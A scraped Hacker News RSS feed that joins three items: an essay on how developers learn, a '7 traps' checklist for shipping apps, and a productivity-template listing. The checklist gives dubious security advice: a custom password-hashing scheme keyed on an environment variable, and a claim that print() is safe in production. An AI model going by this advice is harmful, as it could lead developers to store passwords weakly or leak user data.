Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739249">thread link</a>) | @kiyanwang
<br/>
July 5, 2020 | https://thevaluable.dev/learning-developer-efficiently-effectively/ | <a href="https://web.archive.org/web/*/https://thevaluable.dev/learning-developer-efficiently-effectively/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>
        

        <section>
            
                <picture>
                    
                        <source srcset="https://thevaluable.dev/images/2020/learning_developer/no-mistake.webp" type="image/webp">
                    
                    <img src="https://thevaluable.dev/images/2020/learning_developer/no-mistake.jpg" alt="Learning ">
                </picture>
            

            <p>“I’m trying to go down a bottomless pit. I’ll never make it till the end.”</p>
<p>That’s what I thought when I tried to create my own video game. I was young, beautiful, and I was struggling to use <code>for</code> loops and <code>arrays</code> at the same time.
There was so much to learn!</p>
<p>Fortunately, I found the strength to continue. More and more, the concepts behind programming began to make sense. From there, learning wasn’t a chore anymore, but an intrepid journey. Going through a book about C and trying to create my own adventure on MS-DOS was a crazy Indiana Jone’s-like discovery I’ll never forget.</p>
<p>My first video game wasn’t great, but it was mine. It was <em>my</em> creation. Yet, what I remember today, with a tear in my left eye, is not the result, but the learning process itself. It was these “Aha!” moments which brought me the most joy!</p>
<p>I love learning. For a long, long time. That’s why I tried, through the years, to make my learning gradually more effective and efficient.</p>
<p>Learning is essential for developers. We need to learn about the new breakthroughs, discoveries, and changes in the industry.</p>
<p>We need to learn about our history, to know what’s really new, what’s not, and what to do with it, <em>in what context</em>.</p>
<p>We need to learn about the business domain of the company we’re working with.</p>
<p>We need to learn how to better communicates with our teammates.</p>
<p>We need to learn about what our customers really want.</p>
<p>The list goes on and on.</p>
<p>As you might have guessed, this article will brush over the wide subject of learning, as a developer. We’ll try to answer these questions together:</p>
<ul>
<li>What’s learning?</li>
<li>Why do we learn? Should learning serve a goal?</li>
<li>How to avoid ineffective learning methods, procrastination, and distractions?</li>
<li>Should we have a mentor or learn by ourselves?</li>
<li>Is practice only makes perfect?</li>
<li>How to test ourselves to avoid the illusion of competence?</li>
<li>Are feedback important? What kind of feedback can you get? What feedback should you be interested in?</li>
</ul>
<p>Ready to dive? Good. Take your machete and let’s go together through the Deep Jungle of Knowledge.</p>
<h2 id="whats-learning">What’s learning?</h2>
<p>Sometimes, we can be very surprised of the meaning of common words. Especially if we never question their definitions.</p>
<p>For example, I’m always surprised to hear people saying that learning is only a question of memory. It’s not wrong, but it’s incomplete.</p>
<p>According to the <a href="https://www.lexico.com/definition/learning" target="_blank" rel="noopener">oxford dictionary</a>, learning means:</p>
<blockquote>
<p>The acquisition of knowledge or skills through study, experience, or being taught.</p>
</blockquote>
<p>This gives us clues about how to learn (study, experience, or being taught), but not really about the meaning of “acquisition of knowledge”.</p>
<p>Let’s look at the definition of <a href="https://www.lexico.com/definition/knowledge" target="_blank" rel="noopener">knowledge</a>:</p>
<blockquote>
<p>Facts, information, and skills acquired through experience or education; the theoretical or practical understanding of a subject.</p>
</blockquote>
<p>We can already see, thanks to these definitions, two main foundations for learning:</p>
<ol>
<li>Understanding</li>
<li>Remembering (acquisition)</li>
</ol>
<p>I’ll add a third one:</p>
<ol start="3">
<li>Transfer</li>
</ol>
<p>Transfer is applying the knowledge from the learning context to another context. For example, it could be applying the programming knowledge your learned at school to the side project you always dreamt to build.</p>
<p>Transfer is not a necessity for learning. After all, you can understand and remember something without ever using what you learned.</p>
<p>However, most of the time, we learn in hope to apply the knowledge acquired. That’s why it’s still a major component of our learning experiences.</p>
<h2 id="why-learning">Why Learning?</h2>

<picture>
    <source srcset="https://thevaluable.dev/images/2020/learning_developer/learn-good.webp" type="image/webp">
    <img src="https://thevaluable.dev/images/2020/learning_developer/learn-good.jpg" alt="There is only good in learning">
</picture>



<h3 id="enriching-your-life">Enriching Your Life</h3>
<p>Learning will enrich your life in multiple ways:</p>
<ul>
<li>Your opinions will evolve.</li>
<li>Your vision on the world will change.</li>
<li>You’ll feel strong connections with people who share your interests, creating passionate and mind-binding conversations.</li>
</ul>
<p>Learning can open doors in your professional life:</p>
<ul>
<li>It can help you climbing the corporate ladder.</li>
<li>It can help you to negotiate a better salary. After all, we are <a href="https://en.wikipedia.org/wiki/Knowledge_worker" target="_blank" rel="noopener">knowledge workers</a>: our worth is <em>partly</em> our knowledge.</li>
<li>It will create opportunities for <a href="https://thevaluable.dev/guide-debate-software-developer-skill/">healthy debates with your fellow colleagues</a>.</li>
<li>Your CTO might call you <a href="https://thevaluable.dev/software-developer-titles-junior-senior/">“Rockstar” or “Ninja”</a> too, you lucky pit of knowledge!</li>
</ul>
<h3 id="learning-with-or-without-goals">Learning With or Without Goals?</h3>
<p>When you try to learn something, it’s useful to have concrete goals you want to achieve with the knowledge acquired. These goals could be a good occasion to <em>transfer</em> your knowledge.</p>
<p>For example, you want to learn programming because you always dreamt to create a revolutionary video game, where you can break bricks with a ball. Maybe you want to learn what’s the <a href="https://thevaluable.dev/dry-principle-cost-benefit-example/">DRY principle</a>, to finally refactor your favorite legacy application.</p>
<p>Without meaningful goals, it will be difficult to be motivated in the long run. Learning is not easy. Understanding can be a daunting task (depending of what you learn), remembering even more so, and transfer is maybe the worst of all.</p>
<p>It takes time, too. That’s why being able to reach concrete goals with your new skills and knowledge can be very satisfying. It will give you the needed motivation to continue on your learning path.</p>
<p>It’s even more true when you try to learn complex topics. Your motivation is something you should try to assess and even measure along the way, to see if you need to boost it by making (and finishing) something important to you.</p>
<p>It’s always possible to learn for the sake of learning. Heck, I do it quite a lot myself. Yet, you need to have a good confidence on your motivation, and you need to be aware of the benefits of the learning journey itself.</p>
<p>If you have difficulties to find concrete ideas and goals where you can transfer your new knowledge, I wrote a whole article about techniques <a href="https://thevaluable.dev/generate-programming-side-project-ideas/">to generate project ideas</a>.</p>
<h2 id="how-deep-do-you-want-to-go">How Deep Do You Want to Go?</h2>

<picture>
    <source srcset="https://thevaluable.dev/images/2020/learning_developer/experts.webp" type="image/webp">
    <img src="https://thevaluable.dev/images/2020/learning_developer/experts.jpg" alt="Being an expert is not necessarily your goal">
</picture>



<p>Now that you have your goals, you need to decide <em>how much</em> you want to learn.</p>
<p>After all, you don’t need to be an expert in everything.</p>
<p>Moreover, knowledge acquisition is not like buying a new table for your living room. You need some maintenance not to forget the knowledge and skills acquired.</p>
<p>It means that you need to constantly refresh your knowledge and skills, for everything you want to be an expert at. It takes time, energy, and require, again, a lot of motivation.</p>
<p>For example, let’s say that your life’s dream is to write a PHP script to rename automatically thousands of your holidays pictures. You don’t need to be a PHP evangelist to answer your needs. Trying to understand superficially how PHP works to accomplish what you want might be enough.</p>
<p>Superficial learning works well if you don’t have any goal, too. You can read about programming paradigms for example, by pure curiosity, to have a global overview of all of them. You can still dive deeper if you wish later.</p>
<p>Beyond the superficial, the <a href="https://en.wikipedia.org/wiki/Dreyfus_model_of_skill_acquisition" target="_blank" rel="noopener">Dreyfus model of competence</a> can help you deciding how competent you want to become:</p>
<ul>
<li><strong>Novice</strong> - Shallow understanding, or no understanding at all.</li>
<li><strong>Advanced Beginner</strong> - Can make things works, often rely on following a series of steps.</li>
<li><strong>Competent</strong> - Can spot the roots of problems (background understanding), know all the rules and can select a rule depending of the situation. Still make many mistakes.</li>
<li><strong>Proficient</strong> - Very conscious about performance, know perfectly what approaches to take in what situation.</li>
<li><strong>Expert</strong> - Intuition very well developed, apply his skills without thoughts, performances look magical.</li>
</ul>
<p><a href="https://www.youtube.com/watch?v=i1nzADdV6zk" target="_blank" rel="noopener">Choose your destiny</a>, depending on your needs!</p>
<h2 id="preparing-your-learning-sessions">Preparing Your Learning Sessions</h2>

<picture>
    <source srcset="https://thevaluable.dev/images/2020/learning_developer/learning-not-playing.webp" type="image/webp">
    <img src="https://thevaluable.dev/images/2020/learning_developer/learning-not-playing.jpg" alt="You need to prepare your environment to learn efficiently">
</picture>



<p>Let’s see now how you should prepare yourself before learning anything.</p>
<p>The following advice won’t change your life from one day to another. You need to work on it, actively seeking to apply these advice, day after day. The rewards are, however, huge. I promise.</p>
<h3 id="the-mistakes-to-avoid">The Mistakes to Avoid</h3>
<p>Let’s go back years in your past, when you were young, innocent, and not a caffeine junky yet.</p>
<p>You’re at school. The teacher is speaking about whatever subject he wants you to learn. His tone is monotonous, he doesn’t believe in what he’s saying, you think about what you’ll eat at lunch.</p>
<p>You’re bored.</p>
<p>The seconds feel like minutes. Minutes feel like hours. You can’t do anything, except waiting. Will it ever end? Will you feel joy again? Is it the end of time?</p>
<p>Finally, against all odds, the course end. The teacher ask you to learn a new chapter of your book. He will test you next time.</p>
<p>At home, you read again and again the learning material. You have difficulties to concentrate, but you’re a serious boy (or girl), so you push yourself through. After five reading, you judge yourself good enough to pass the next test.</p>
<p>You close your book, satisfied with yourself, and switch on the TV, because Youtube might not exist yet.</p>
<p>What I just described is the worst way to learn something. <em>Passively</em> listening to somebody, then <em>passively</em> going through some learning materials might teach you something, but very, very slowly. You don’t need to be in a class for that: just switch on Youtube and consume <em>passively</em> any video on programming.</p>
<p>When you close your book after your passive learning, you think you learned something. Yet, when you’ll pass your test, you’ll understand that you really didn’t.</p>
<p>This is called <strong>illusion of competence</strong>: we have often the <em>impression</em> we learned something, even if we didn’t.</p>
<p>You should spend most of your time <em>actively learning</em>. You need to be an actor in your own learning, not only consuming it like you would consume Netflix.</p>
<p>I would compare active learning as playing a video game. Yes, I was a video game junky.</p>
<p>When you play, you’re actively doing something. Consequently, I’m sure you can remember many more video games than what you read in your last books.</p>
<p>This is due to two things:</p>
<ol>
<li>Video games are fun. You can make your learning experience fun, too. More you’ll learn what you love, more you’ll like the process of learning.</li>
<li>Playing is an active endeavor, not a passive one.</li>
</ol>
<p>That being said, before actively learning, you need first …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thevaluable.dev/learning-developer-efficiently-effectively/">https://thevaluable.dev/learning-developer-efficiently-effectively/</a></em></p>]]>
            </description>
            <link>https://thevaluable.dev/learning-developer-efficiently-effectively/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739249</guid>
            <pubDate>Sun, 05 Jul 2020 15:11:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Must Know 7 Traps That Make Your Software Useless]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739023">thread link</a>) | @yassinerajallah
<br/>
July 5, 2020 | https://devhypercharged.com/the-7-traps-that-make-your-software-unusable/ | <a href="https://web.archive.org/web/*/https://devhypercharged.com/the-7-traps-that-make-your-software-unusable/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			
			
<p><span>One of the unspoken areas about software development is building usable software. Learning how to code, coding something, and having it used by thousands is no easy task. In this article, I’ll be discussing the most important pillars that you need to address before launching your product.&nbsp;</span></p>

<p><span>My first app ever made was a social media, if you exceed 100 comments/post the app becomes crazy slow, the database over fetches, authentication was broken, and the whole world was burning down. Not a great spot to be in, but this goes without saying that paying close attention to some little details will save you months of technical debt and headache.&nbsp;</span></p>

<p><span>Note: Each point can be open for debate, this is what will get you started, the more you learn, the more reliable your app becomes.</span></p>

<p><span>Think of this as a checklist for your next product:</span></p>

<h2><span><strong>1- Code Safety</strong></span></h2>

<p><span>While coding (or when finished) the app, you want to make sure that the environment is safe, no user data is leaking, and the app is reliable and ready to scale for any spikes of usage.&nbsp;</span></p>

<ul>
<li><span>Avoid unwrapping values the unsafe way (aka check if the value is nil) then execute your logic. Surprisingly, this isn’t talked about that much and as a fresh software developer, you never know what will crash your app. You should never be 100% sure that a value won’t be nil, weird stuff happens.&nbsp;</span></li>
<li><span>Avoid retain cycles: While these are caused unintentionally and not easy to detect, you will need to run a check for your app to detect if memory is retained for some unused objects. Each IDE has tools to help you check for retain cycles and you need to make use of them. Xcode for example has a tab where you can detect memory spikes, deallocations, and CPU usage. There are many ways to detect if something is wrong with your app, hardware-wise, make sure to search on the net depending on your platform.&nbsp;</span></li>
</ul>

<figure><span><a href="https://cdn.substack.com/image/fetch/c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F6b161812-de63-476e-b3c7-011b91f60f1f_606x619.png" target="_blank" rel="noreferrer noopener"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F6b161812-de63-476e-b3c7-011b91f60f1f_606x619.png" alt="" data-src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F6b161812-de63-476e-b3c7-011b91f60f1f_606x619.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a></span></figure>

<ul>
<li><span>Protect your secret keys! More often than not, you’ll find yourself using 3rd party services. These services provide a “secret key” and a “test key” to get access to their API. In production you use the “secret key” and it’s secret for a reason. If leaked, another person will use it and you’ll pay the bill 🙂 not so fun. Even worse, this might leak your users’ data or even shut down the servers. That’s why it’s important to make use of “environment variables”. As the name applies, these are variables that live in the local machine. Say when a script wants to have access to that secret key, it can get it from the local machine. This way, you aren’t hardcoding anything into the script and at the same time keeping your code clean and secure.</span></li>
<li><span>Passwords: Now this is an underrated problem that isn’t talked about and can bring down a whole corporation. In some cases, when you aren’t using reliable 3rd party services for authentication such as AWS &amp; Firebase, you need to be hashing the passwords yourself. Personally, I always keep the hashing function as part of the API in a separate file. I include a random environment variable that I can keep track of which dictates how the password will be generated for a specific user depending on the information provided. And we are set! I don’t need to know my users’ password, I trigger the “sign-in” by triggering the same hashing function using the environment variable I stored before and everything is secure.</span></li>
<li><span>Don’t keep “Logs” (similar to print) when building for production! This is a great way to shoot yourself in the leg, keeping logging functions extends to the build and if you are logging sensitive information you’ll get in trouble. Just stick with classic print() statements; these are safe for usage in production and aren’t logged (from an iOS point of view)</span></li>
</ul>

<h2><span><strong>2-</strong> <strong>Help your project help you</strong></span></h2>

<p><span>After building a couple of apps in different areas with moderate difficulty, you’ll wish you’ve done many things differently, note these down and use them in your next project! My projects went from utter spaghetti mess to a clean hierarchy.&nbsp;</span></p>

<ul>
<li><span>In my case, I found it hard to keep track of the placement of my files in Xcode, so for each screen, I had a folder. The folder contains front-end logic, backend-logic, and unique utilities. As for general utilities, I’d keep them in a global folder to refer to them from every other file.</span></li>
<li><span>Think of factorizing the most. When coding, you want to have a file work as a global factor for other scripts that use the same functionality.</span></li>
<li><span>At some point, you’ll realize you are dealing with many folders, and your project is huge, but this is a thousand times better than having everything crammed into one folder and you waste 30seconds to just find a file</span></li>
</ul>

<p><span>You don’t need to follow my pattern. Find yours and keep experimenting.&nbsp;</span></p>

<h2><span><strong>3-</strong> <strong>Your servers will make you pay for what you don’t know (Literally)&nbsp;</strong></span></h2>

<p><span>Sometimes it’s tempting to use 3rd party services since they can make life easier. I’m all down for using these services and in fact, I use them a lot. However, you need to know the inside outs of their billing policies and know what you are billed for.&nbsp;</span></p>

<p><span>Rule of thumb:&nbsp;</span></p>

<ul>
<li><span>Add a service&nbsp;<strong>only when&nbsp;</strong>it can save you costs and/or enhance your UX. Yes, I just said you need to add a service that will save you money. For example; AWS has a free-tier usage per service. So instead of putting the pressure on just 1 service, you can make use of multiple, you take the roundabout but you end up saving costs early on.&nbsp;</span></li>
<li><span>Algorithmically speaking, you can save Database costs on your client-side. The intuitive way is by making fewer calls, caching user information, and preloading data for future usage. This obviously adds more work client-side, but it’s getting easier to integrate offline capabilities than ever.&nbsp;&nbsp;</span></li>
</ul>

<blockquote>
<p><span>Note:&nbsp; by experience, I noticed the more you save money client-side, the better is your UX, and the higher the performance gets. I’m aware this is a bold point to make so I’ll leave diving into it for another episode.</span></p>
</blockquote>

<ul>
<li><span>Scalability wise, make sure to keep your code usable for huge traffic spikes, these are basic algorithm analysis techniques and they are often shorter to code. For example: Use built-in sort functions, don’t’ iterate every time on a list of 100 items and above, cache your results, make use of dynamic programming (in short the previous result helps with the next result; read more on this&nbsp;<a href="https://medium.com/free-code-camp/demystifying-dynamic-programming-3efafb8d4296">here</a>)&nbsp;</span></li>
</ul>

<h2><span><strong>4- Just when you think you’re done…. Layout Issues</strong></span></h2>

<p><span>By now, you might think you’re done, but there is a bit more to the story. You’re very close though cheer up!&nbsp;</span></p>

<p><span>Often when building your projects, checking tutorials, StackOverflow, etc… you find hardcoded pixel values, typically: (width: 100, height: 100) or similar. These hardcoded are made for simplicity’s sake. No, your app won’t scale because each device has different # of pixels, etc.. That’s why:</span></p>

<ul>
<li><span>When coding, avoid using hardcoded values and make use of a percentage. You can have 2 static variables in a separate class from which you get the height and width of the current screen. This way while coding my layout I have fast access and scalable way of presenting my layout.&nbsp;</span>
<ul>
<li><span>Typically, you ‘ll be calling the class as : SomeClass.screenWidth * 0.5, this means “make my button’s width half of the super view’s width”</span></li>
<li><span>Same applies for the height</span></li>
</ul>
</li>
<li><span>Test on different physical devices, simulators aren’t that bad but sometimes screw up layout-wise, they also have more performance since they run on your computer. Sometimes when a layout or animation looks smooth, you might want to test it on a&nbsp; physical device and double-check for yourself.</span></li>
</ul>

<p><span>Don’t stress over the layout too much, have a fair looking one, make use of 3rd party packages/plugins/libraries for animation, there are many free services that help make your app look neat for the least effort possible. Remember, we are all about 20% investment 80% return in this newsletter 🙂</span></p>

<h2><span><strong>5-</strong> <strong>Client Error Handling: You can get away with this, but don’t overlook it</strong></span></h2>

<p><span>Error handling is fun, right? Or you might think you don’t need it so you just use a standard popup to show any “Error, try again later” message. DON’T. Bad coding, bad bad bad. Every app will crash/fail at some point, you want to provide a targetted message to what happened. While you can’t know every reason for failure, you know the error code. To get my projects up and running, I embed the error code with a standard failure popup, this way, when a user reports the problem during beta/production, I check the logs for the code. Fast and easy debugging!</span></p>

<p><span>At a later stage, you want to remove the codes and move to “natural language explanation”. You’ll start working on this when the time comes for enhancing your UX further.</span></p>

<h2><span><strong>6-</strong> <strong>Cross Services Error Handling</strong></span></h2>

<p><span>Same as in the previous case, but one important matter to take into consideration, if you are dealing with a financial backend (aka Stripe, etc..) you want to have your webhooks (API that receives transaction calls from Stripe, Paypal, etc… and here you update your database) react the right way. Error handling here is critical because you don’t want to flag a user as non-paying because they had their payment attempt succeed but you failed to call the database and make the necessary updates.</span></p>

<h2><span><strong>7-</strong> <strong>Test Cases: You can get away with this too</strong></span></h2>

<p><span>Writing test cases is indispensable for reliable software, especially when scaling and adding more features as a team. You never know who coded what and how that reacted with a piece of code you’ve written. If you are a solo developer and about to ship a basic product, you might get away with skipping this step but you need to keep in mind you’ll have to write test cases to avoid basic bugs in the future.</span></p>

<p><span>Well, this was a lengthy one. I hope you found this article helpful; sorry I had to make it this long but the process had to be detailed and practical. Consider sharing with your friends and anyone who might find this article helpful; and if you aren’t subscribed, consider doing so!&nbsp;</span></p>

<p><span>Until the next time, take care, byeeeeeee 🙂</span></p>

			
			
</div></div>]]>
            </description>
            <link>https://devhypercharged.com/the-7-traps-that-make-your-software-unusable/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739023</guid>
            <pubDate>Sun, 05 Jul 2020 14:41:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Free Productivity Templates – by experienced project delivery manager]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738963">thread link</a>) | @sssmith12
<br/>
July 5, 2020 | https://slidegame.io/templates/productivity | <a href="https://web.archive.org/web/*/https://slidegame.io/templates/productivity">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article data-page-sections="5f0081cc65a3745ddd2e2989" id="sections">
  
    <section data-section-id="5f0081cc65a3745ddd2e298b" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
  &quot;imageOverlayOpacity&quot; : 0.15,
  &quot;video&quot; : {
    &quot;playbackSpeed&quot; : 0.5,
    &quot;filter&quot; : 1,
    &quot;filterStrength&quot; : 0,
    &quot;zoom&quot; : 0
  },
  &quot;backgroundWidth&quot; : &quot;background-width--full-bleed&quot;,
  &quot;sectionHeight&quot; : &quot;section-height--medium&quot;,
  &quot;horizontalAlignment&quot; : &quot;horizontal-alignment--center&quot;,
  &quot;verticalAlignment&quot; : &quot;vertical-alignment--middle&quot;,
  &quot;contentWidth&quot; : &quot;content-width--wide&quot;,
  &quot;sectionTheme&quot; : &quot;&quot;,
  &quot;sectionAnimation&quot; : &quot;none&quot;,
  &quot;backgroundMode&quot; : &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      <div data-content-field="main-content" data-item-id="">
  <article id="article-">
  
    <div>
      <div>
        
        <div>
          
            <div data-content-field="categories">
              <p><span><a href="https://slidegame.io/templates?category=Productivity">Productivity</a></span>
            </p></div>
          

          <div data-animation-role="date">
            <p><time datetime="Jul 4" pubdate="" data-content-field="published-on">
              <span>Jul 4</span>
            </time></p><div data-content-field="author"><p>Written By <a href="https://slidegame.io/templates?author=5ee5fe816458d8282c591aa9">Undercover Consultant</a></p></div>
          </div>
        </div>
      </div>

      <div>
        <div><div data-layout-label="Post Body" data-type="item" id="item-5f00cb5c894f6b087dccdc0d"><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1593954613854_4362"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee5ffd0884b542830fe6f69/1593954668728-VCGSX8PK4KLKR54ARKMB/ke17ZwdGBToddI8pDm48kPTrHXgsMrSIMwe6YW3w1AZ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0k5fwC0WRNFJBIXiBeNI5fKTrY37saURwPBw8fO2esROAxn-RKSrlQamlL27g22X2A/image-asset.jpeg" data-image="https://images.squarespace-cdn.com/content/v1/5ee5ffd0884b542830fe6f69/1593954668728-VCGSX8PK4KLKR54ARKMB/ke17ZwdGBToddI8pDm48kPTrHXgsMrSIMwe6YW3w1AZ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0k5fwC0WRNFJBIXiBeNI5fKTrY37saURwPBw8fO2esROAxn-RKSrlQamlL27g22X2A/image-asset.jpeg" data-image-dimensions="2500x1406" data-image-focal-point="0.5,0.5" alt="" data-load="false" data-image-id="5f01d16b6e62565b9d37f148" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ee5ffd0884b542830fe6f69/1593954668728-VCGSX8PK4KLKR54ARKMB/ke17ZwdGBToddI8pDm48kPTrHXgsMrSIMwe6YW3w1AZ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0k5fwC0WRNFJBIXiBeNI5fKTrY37saURwPBw8fO2esROAxn-RKSrlQamlL27g22X2A/image-asset.jpeg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;collectionId&quot;:&quot;5ef789ceaa257013942e5695&quot;,&quot;design&quot;:&quot;list&quot;,&quot;headerText&quot;:&quot;Featured&quot;,&quot;textSize&quot;:&quot;large&quot;,&quot;pageSize&quot;:10,&quot;imageAspectRatio&quot;:&quot;Auto&quot;,&quot;columnWidth&quot;:304,&quot;gutter&quot;:66,&quot;listImageSize&quot;:49,&quot;listImageAlignment&quot;:&quot;left&quot;,&quot;slidesPerRow&quot;:3,&quot;textAlignment&quot;:&quot;left&quot;,&quot;showTitle&quot;:true,&quot;showThumbnail&quot;:true,&quot;showExcerpt&quot;:true,&quot;showReadMoreLink&quot;:false,&quot;showPrice&quot;:true,&quot;productQuickViewEnabled&quot;:false,&quot;showPastOrUpcomingEvents&quot;:&quot;upcoming&quot;,&quot;metadataPosition&quot;:&quot;below-content&quot;,&quot;primaryMetadata&quot;:&quot;cats&quot;,&quot;secondaryMetadata&quot;:&quot;date&quot;,&quot;filter&quot;:{&quot;categoryIds&quot;:null,&quot;category&quot;:&quot;Productivity&quot;},&quot;autoCrop&quot;:true,&quot;lightbox&quot;:false,&quot;mixedContent&quot;:true,&quot;blockId&quot;:&quot;d0a4e93a683c2a59e72f&quot;}" data-block-type="55" id="block-yui_3_17_2_1_1593887581579_3803"><div>



<div>

  <div>

    <header>

      <!-- Collection Title -->
      <p><span>Featured</span>
        
      </p>

      <!-- Carousel Nav -->
      

    </header>

    <div>

      

        <div>

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="https://docs.google.com/spreadsheets/d/1SI4MpmbPEfAHyu9rq6d4zkIKk4Rz3rGWwDJIqG3B84Y/edit?usp=sharing" data-title="Weekly Productivity Planner" data-description="">
      <p><img data-src="https://static1.squarespace.com/static/5ee5ffd0884b542830fe6f69/5ef789ceaa257013942e5695/5f007d88d100920c14698bec/1593956094870/Weekly+Planner.png" data-image="https://static1.squarespace.com/static/5ee5ffd0884b542830fe6f69/5ef789ceaa257013942e5695/5f007d88d100920c14698bec/1593956094870/Weekly+Planner.png" data-image-dimensions="2500x1438" data-image-focal-point="0.5,0.5" alt="Weekly Productivity Planner" data-load="false" src="https://static1.squarespace.com/static/5ee5ffd0884b542830fe6f69/5ef789ceaa257013942e5695/5f007d88d100920c14698bec/1593956094870/Weekly+Planner.png">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            <div>
              
              <div>

	





	<!-- Categories -->
	<p><span><a href="https://slidegame.io/individual-templates?category=Productivity">Productivity</a></span>








</p></div>
              
              <p><time datetime="2020-07-04">Jul 4, 2020</time>
	











</p>
            </div>

            
              <!-- Title -->
              <div>
                <p><a href="https://docs.google.com/spreadsheets/d/1SI4MpmbPEfAHyu9rq6d4zkIKk4Rz3rGWwDJIqG3B84Y/edit?usp=sharing">Weekly Productivity Planner</a></p></div>
            

            <!-- Metadata (Below Title) -->
            <div>
            
              <div>

	





	<!-- Categories -->
	<p><span><a href="https://slidegame.io/individual-templates?category=Productivity">Productivity</a></span>








</p></div>
              
              <p><time datetime="2020-07-04">Jul 4, 2020</time>
	











</p>
            </div>

            
              
            

            
              
              <!-- Excerpt -->
                <p>Complete productivity planning system inspired by <a href="https://twitter.com/jackbutcher" target="">@JackButcher</a>’s Daily Manifest</p>
              

              

              
            

            <!-- Metadata (Below Content) -->
            <div>
              
              <div>

	





	<!-- Categories -->
	<p><span><a href="https://slidegame.io/individual-templates?category=Productivity">Productivity</a></span>








</p></div>
              
              <p><time datetime="2020-07-04">Jul 4, 2020</time>
	











</p>
            </div>

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

        <div>

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="https://docs.google.com/spreadsheets/d/1AvuJ3o45X4aNbGKx01t1vFYOU9qh6H3825P5G0vdPg8/edit?usp=sharing" data-title="To Do Dashboard" data-description="">
      <p><img data-src="https://static1.squarespace.com/static/5ee5ffd0884b542830fe6f69/5ef789ceaa257013942e5695/5f007ce9c56ace3ec38705a6/1593953987776/To+Do+Dashboard.png" data-image="https://static1.squarespace.com/static/5ee5ffd0884b542830fe6f69/5ef789ceaa257013942e5695/5f007ce9c56ace3ec38705a6/1593953987776/To+Do+Dashboard.png" data-image-dimensions="2500x1438" data-image-focal-point="0.5,0.5" alt="To Do Dashboard" data-load="false" src="https://static1.squarespace.com/static/5ee5ffd0884b542830fe6f69/5ef789ceaa257013942e5695/5f007ce9c56ace3ec38705a6/1593953987776/To+Do+Dashboard.png">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            <div>
              
              <div>

	





	<!-- Categories -->
	<p><span><a href="https://slidegame.io/individual-templates?category=Productivity">Productivity</a></span>








</p></div>
              
              <p><time datetime="2020-07-04">Jul 4, 2020</time>
	











</p>
            </div>

            
              <!-- Title -->
              <div>
                <p><a href="https://docs.google.com/spreadsheets/d/1AvuJ3o45X4aNbGKx01t1vFYOU9qh6H3825P5G0vdPg8/edit?usp=sharing">To Do Dashboard</a></p></div>
            

            <!-- Metadata (Below Title) -->
            <div>
            
              <div>

	





	<!-- Categories -->
	<p><span><a href="https://slidegame.io/individual-templates?category=Productivity">Productivity</a></span>








</p></div>
              
              <p><time datetime="2020-07-04">Jul 4, 2020</time>
	











</p>
            </div>

            
              
            

            
              
              <!-- Excerpt -->
                <p>Prioritise your to-do list with this template based on Eisenhower’s Matrix</p>
              

              

              
            

            <!-- Metadata (Below Content) -->
            <div>
              
              <div>

	





	<!-- Categories -->
	<p><span><a href="https://slidegame.io/individual-templates?category=Productivity">Productivity</a></span>








</p></div>
              
              <p><time datetime="2020-07-04">Jul 4, 2020</time>
	











</p>
            </div>

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

        <div>

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="https://docs.google.com/spreadsheets/d/1mvsCTgGzEu5HSGQrXOh53zaYPFIa9u5bq07JOMb006M/edit?usp=sharing" data-title="To-Do Kanban" data-description="">
